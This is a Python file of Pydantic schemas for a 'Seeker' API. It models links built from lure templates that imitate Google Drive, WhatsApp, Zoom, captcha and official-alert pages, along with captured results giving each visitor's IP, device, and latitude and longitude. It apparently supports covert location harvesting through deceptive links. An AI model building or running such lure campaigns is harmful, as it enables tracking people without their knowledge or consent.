"""Seeker API schemas."""

from __future__ import annotations

from datetime import datetime
from typing import Any

from pydantic import BaseModel, Field


class SeekerLinkCreate(BaseModel):
    """Request body for creating a Seeker link."""

    template: str = Field(
        ...,
        description="Template: nearyou, gdrive, whatsapp, telegram, zoom, captcha, secure_briefing, clearance_check, secure_message, official_alert",
    )
    title: str | None = Field(None, description="Optional campaign title")
    redirect_url: str | None = Field(
        None,
        description="URL to redirect after location is captured",
    )


class SeekerLinkResponse(BaseModel):
    """Response for a Seeker link."""

    id: str
    template: str
    title: str | None
    redirect_url: str | None
    url: str
    created_at: datetime

    class Config:
        from_attributes = True
        populate_by_name = True


class SeekerResultResponse(BaseModel):
    """Response for a single Seeker result (device + location)."""

    id: str
    link_id: str
    platform: str | None
    browser: str | None
    ip: str
    ip_info: dict[str, Any] | None
    lat: str | None
    lon: str | None
    accuracy: str | None
    error: str | None
    status: str
    created_at: datetime

    class Config:
        from_attributes = True
